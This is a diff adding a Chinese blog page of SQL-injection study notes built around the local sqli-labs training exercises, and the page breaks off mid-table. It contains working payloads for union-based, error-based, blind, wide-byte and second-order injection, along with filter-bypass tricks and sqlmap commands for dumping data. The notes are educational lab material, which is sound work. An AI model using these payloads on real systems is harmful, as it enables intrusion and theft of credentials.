@@ -1,0 +1,1441 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,SQL注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="开始web学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入学习笔记">
+<meta property="og:url" content="http://yoursite.com/2020/06/05/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="SCERush">
+<meta property="og:description" content="开始web学习">
+<meta property="article:published_time" content="2020-06-05T05:53:31.000Z">
+<meta property="article:modified_time" content="2020-06-11T10:03:30.072Z">
+<meta property="article:author" content="SCERush">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/06/05/SQL注入学习笔记/"/>
+
+
+
+
+
+  <title>SQL注入学习笔记 | SCERush</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SCERush</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/05/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="SCERush">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/blog.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SCERush">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-05T13:53:31+08:00">
+                2020-06-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  13
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>开始web学习</p>
+<a id="more"></a>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>在MySQL 5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有schemata（数据库名）、tables（表名）、columns（列名或字段名）。</p>
+<p>在schemata表中，schema_name字段用来存储数据库名。</p>
+<p>在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p>
+<p>在columns表中，tanle_schema（数据库名）、table_name（表名）、column_name（字段名）</p>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>注释符：在MySQL中常见的注释符表达式：#，—空格，/**/</p>
+<p>内联注释：<code>/*! SQL语句 */</code> 只有MySQL可以识别，常用于绕过WAF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 例：</span><br><span class="line">select * from user where id &#x3D; id;</span><br><span class="line"># 使用内联注释注入：</span><br><span class="line">select * from user where id &#x3D; -1 &#x2F;*!union*&#x2F; &#x2F;*!select*&#x2F; 1,2,3,4</span><br></pre></td></tr></table></figure>
+<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>一般用户登陆所用的SQL语句为：<code>SELECT * FROM user WHERE username= &#39;admin&#39; and password=&#39;passwd&#39;</code>，若对用户输入的用户名和密码无处理，则可构造万能密码绕过验证‘ or 1 #，SQL语句就变为：<code>SELECT * FROM user WHERE username= &#39;&#39; or 1 # and password=&#39; &#39;</code>，#号后注释。</p>
+<h1 id="SQL注入分类及判断"><a href="#SQL注入分类及判断" class="headerlink" title="SQL注入分类及判断"></a>SQL注入分类及判断</h1><ol>
+<li>数据类型<ul>
+<li>数字型</li>
+<li>字符型</li>
+<li>搜索型</li>
+</ul>
+</li>
+<li>提交方式<ul>
+<li>GET型</li>
+<li>POST型</li>
+<li>Cookie型</li>
+<li>HTTP请求头注入</li>
+</ul>
+</li>
+<li>执行效果<ul>
+<li>报错注入</li>
+<li>联合查询注入</li>
+<li>堆叠查询注入</li>
+<li>盲注<ul>
+<li>基于bool</li>
+<li>基于时间</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>数字型注入查询语句为：<code>SELECT * FROM user WHERE id=1</code>,搜索型注入为查询语句为：<code>SELECT * FROM user WHERE search like &#39;%1%&#39;</code>。</p>
+<p>在URL或者表单中输入0 or 1，如果可以查到数据，说明是数字型注入，如果输入0’or 1#，查到数据说明是字符型注入，方法不唯一。</p>
+<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><p>使用联合查询时，必须使得两张表的表结构一致<br>构造联合注入语句：<code>1&#39; order by 1#</code> or <code>1&#39; order by 2#</code><br>构造联合查询语句：<code>&#39;union select 1,2#</code><br>以上构造可查询表的列数</p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>Blind SQL是注入攻击的其中一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果。这种攻击的出现是应为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题</p>
+<p>当攻击者利用SQL注入漏洞进行攻击时，有时候web应用程序会显示，后端数据库执行SQL查询返回的错误信息。盲注与常规注入很接近，不同的是数据库返回数据的检索方式。若书库没有输出数据到web页面，攻击者会询问一系列的true或false问题，强制从数据库获取数据</p>
+<h2 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h2><p>通常使用函数length()，返回长度；ascii()，返回ASCII值；substr(string,a,b)，返回string以a开头，长度为b的字符串；count()，返回数量。</p>
+<p>在存在注入的注入点参数后使用if判断正确或错误的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select length(database());</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1));</span><br><span class="line">select ascii(substr(database(),1,1)) &gt; N;</span><br><span class="line">select ascii(substr(database(),1,1)) &#x3D; N;</span><br><span class="line">select ascii(substr(database(),1,1)) &lt; N;</span><br></pre></td></tr></table></figure>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>除了需使用以上函数之外，一般还使用延时函数sleep()，if(c,a,b)等等。</p>
+<p>在存在注入的注入点参数后使用<code>if(length(database())&gt;5,sleep(5),null)</code>，如果执行的页面响应时间大于5秒，那么存在注入，并且对相应的SQL语句执行。</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入形式上是两个嵌套的查询，即select…(select…)，里面的select被称为子查询，他执行的顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：</p>
+<ul>
+<li>rand()随机函数，返回0~1之间的某个值</li>
+<li>floor(a)取整函数，返回小于等于a，且最接近a的一个整数</li>
+<li>count()聚合函数，也成计数函数，返回查询对象的总数</li>
+<li>group by clause分组函数，按照查询结果分组</li>
+</ul>
+<p>通过报错来显示具体的信息</p>
+<p>查询的时候如果使用rand()的话，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果续表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中 floor(rand(0)*2)的值是定值，为011011</p>
+<p>select count(*) from table group by floor(rand(0)*2);</p>
+<p>例：sqli Less5</p>
+<p>获取数据库</p>
+<p><code>http://127.0.0.1/sqli/Less-5/?id=0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a)limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</code></p>
+<p>获取表名</p>
+<p><code>http://127.0.0.1/sqli/Less-5/?id=0&#39; union select 1,2,3 from (select count(*),concat((select concat(group_concat(table_name),0x3a,0x3a)from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</code></p>
+<p>获取用户信息</p>
+<p><code>http://127.0.0.1/sqli/Less-5/?id=0&#39; union select 1,2,3 from (select count(*),concat((select concat(username,0x3a,0x3a,password,0x3a,0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</code></p>
+<h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>如果出现中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤</p>
+<p>可以通过修改关键字内字母大小写来绕过过滤措施。例：AnD 1=1</p>
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>如果在程序设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。因为在过滤过程中只进行了一次替换，就是将关键字替换为空</p>
+<p>例：过滤了union 只要发现union时，无论大小写都会被替换为空</p>
+<p>ununionion，UnunionIon</p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>可以利用网路中的url在线编码，绕过SQL注入的过滤机制</p>
+<h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><p>在Mysql中内联注释中的内容可以被当做SQL语句执行</p>
+<h1 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h1><ol>
+<li><p>判断是否存在SQL注入</p>
+<p><code>1&#39; or 1 --+</code></p>
+</li>
+<li><p>利用order by判断字段数</p>
+<p><code>1&#39; order by 1 --+</code> 或 <code>1&#39; order by 2 --+</code></p>
+</li>
+<li><p>利用union select联合查询，获取表名</p>
+<p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
+</li>
+<li><p>利用union select联合查询，获取字段名</p>
+<p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+</li>
+</ol>
+<p>sqlmap：</p>
+<ol>
+<li><p>sqlmap -u “<a href="http://www.xx.com?id=x" target="_blank" rel="noopener">http://www.xx.com?id=x</a>“    （查询是否存在注入点）</p>
+</li>
+<li><p>—dbs（检测站点包含哪些数据库）</p>
+</li>
+<li><p>—current-db（获取当前的数据库名）</p>
+</li>
+<li><p>-D “db_name” —tables（获取指定数据库中的表名 -D后接指定的数据库名称）</p>
+</li>
+<li><p>-D “db_name” -T “table_name” —columns（获取数据库表中的字段）</p>
+</li>
+<li><p>-D “db_name” -T “table_name” -C “columns_name” —dump (获取字段的数据内容)</p>
+</li>
+</ol>
+<h1 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h1><h2 id="HTTP头中的注入介绍"><a href="#HTTP头中的注入介绍" class="headerlink" title="HTTP头中的注入介绍"></a>HTTP头中的注入介绍</h2><p>在安全意识越来越重视的情况下，很多网站都在防止漏洞的发生。例如在SQL注入中，用户提交的参数都会被代码中的某些措施进行过滤。</p>
+<p>但是对于HTTP头中提交的内容很有可能就没有进行过滤。例如HTTP头中 User-Agent、Referer、Cookies等。</p>
+<h2 id="HTTP-User-Agent注入"><a href="#HTTP-User-Agent注入" class="headerlink" title="HTTP  User-Agent注入"></a>HTTP  User-Agent注入</h2><p>sqli Less18</p>
+<p>源文档语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br></pre></td></tr></table></figure>
+<p>payload:<br>updatexml(xml document,xpath_string,new_value):<br>第一个参数：XML文档对象名称。<br>第二个参数：XPath字符串。<br>第三个参数：替换查找到的符合条件的数据。<br><code>&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#39;1&#39;=&#39;1</code></p>
+<h1 id="绕过去除特定字符的SQL注入"><a href="#绕过去除特定字符的SQL注入" class="headerlink" title="绕过去除特定字符的SQL注入"></a>绕过去除特定字符的SQL注入</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+<p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
+<p>参数说明：</p>
+<ul>
+<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
+<li>$replacement: 用于替换的字符串或字符串数组。</li>
+<li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
+<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
+<li>$count: 可选，为替换执行的次数。</li>
+</ul>
+<h2 id="去除注释符"><a href="#去除注释符" class="headerlink" title="去除注释符"></a>去除注释符</h2><p>代码示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure>
+<p>绕过策略：</p>
+<p>利用<code>or &#39;1&#39; = &#39;1</code>闭合后面的单引号</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-23/?id=-1' union select 1,database(),'3</span><br></pre></td></tr></table></figure>
+<h2 id="去除and和or"><a href="#去除and和or" class="headerlink" title="去除and和or"></a>去除and和or</h2><p>代码示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = preg_replace(<span class="string">'/or/'</span>, <span class="string">""</span>, $id);</span><br><span class="line">$id = preg_replace(<span class="string">'/and/'</span>, <span class="string">""</span>, $id);</span><br></pre></td></tr></table></figure>
+<p>绕过策略：</p>
+<ol>
+<li>大小写变形，代码中大小写不敏感，都会被剔除</li>
+<li>在这两个敏感词汇中添加注释，例如：a/**/nd 双写绕过oorr</li>
+<li>利用符号替代：and—&amp;&amp;，or—||</li>
+</ol>
+<h2 id="去除空格"><a href="#去除空格" class="headerlink" title="去除空格"></a>去除空格</h2><p>代码示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过策略：</p>
+<p>编码：hex，urlencode</p>
+<p>空格URL编码 %20、%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>GBK编码占用两字节<br>ASCII编码占用一字节<br>PHP中编码为GBK，函数执行添加的是ASCII编码，MySQL默认字符集是GBK等宽字节字符集。</p>
+<p>%DF’：会被PHP当中的addslashes函数转义成为“%DF\\’”，“\\”既URL里的“%5C”，那么也就是说，“%DF”会被转成“%DF%5C%27”，若网站的字符集是GBK，MySQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。</p>
+<p>代码分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br></pre></td></tr></table></figure>
+<p>sqli Less33</p>
+<p>payload: <code>id=%df&#39; --+</code></p>
+<p>sqlmap: <code>sqlmap -u &quot;url?id=1%df%27&quot; --search --level 3 --risk 1</code></p>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>最长是通的宽字节注入是利用%df，其实只要第一个ascii吗大于128就可以了，比如ascii吗为129的，将129（十进制）转换为十六进制，为0x81，然后在十六进制前加%即可，即为%81</p>
+<p>GBK首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F）</p>
+<p>代码分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash   </span></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br></pre></td></tr></table></figure>
+<p>sqli Less32</p>
+<p>payload: <code>id=%bf&#39; --+</code></p>
+<p>sqlmap: <code>sqlmap -u &quot;url?id=1&quot; --tamper=unmagicquotes.py</code></p>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
+<p>sqli Less24</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></figure>
+<p>通过部分源代码得知，此处使用了<code>mysql_real_escape_string</code>进行转义，无法SQL注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注册</span><br><span class="line">Username:admin&#39; -- -</span><br><span class="line">Password:123</span><br></pre></td></tr></table></figure>
+<p>然后登录发现可以更改密码，因为更改密码的操作是</p>
+<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
+<p>假设更改的密码是123456</p>
+<p>此处执行的SQL语句为</p>
+<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;123456&#39; where username=&#39;admin&#39; -- &#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
+<p>即将admin的密码进行了更改</p>
+<h1 id="MySQL注入常用函数"><a href="#MySQL注入常用函数" class="headerlink" title="MySQL注入常用函数"></a>MySQL注入常用函数</h1><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">函数名称</th>
+<th style="text-align:center">函数功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">system_user()</td>
+<td style="text-align:center">系统用户名</td>
+</tr>
+<tr>
+<td style="text-align:center">user()</td>
+<td style="text-align:center">用户名</td>
+</tr>
+<tr>
+<td style="text-align:center">current_user()</td>
+<td style="text-align:center">当前用户名</td>
+</tr>
+<tr>
+<td style="text-align:center">session_user()</td>
+<td style="text-align:center">连接数据库的用户名</td>
+</tr>
+<tr>
+<td style="text-align:center">database()</td>
+<td style="text-align:center">数据库名</td>
+</tr>
+<tr>
+<td style="text-align:center">version()</td>
+<td style="text-align:center">数据库版本</td>
+</tr>
+<tr>
+<td style="text-align:center">@@datadir</td>
+<td style="text-align:center">数据库路径</td>
+</tr>
+<tr>
+<td style="text-align:center">@@basedir</td>
+<td style="text-align:center">数据库安装路径</td>
+</tr>
+<tr>
+<td style="text-align:center">@@version_compile_os</td>
+<td style="text-align:center">操作系统</td>
+</tr>
+<tr>
+<td style="text-align:center">count()</td>
+<td style="text-align:center">返回执行结果数量········</td>
+</tr>
+<tr>
+<td style="text-align:center">concat()</td>
+<td style="text-align:center">没有分隔符的连接字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">concat_ws()</td>
+<td style="text-align:center">含有分隔符的连接字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">group_concat</td>
+<td style="text-align:center">连接一个组的所有字符串，并以逗号分隔每一条数据</td>
+</tr>
+<tr>
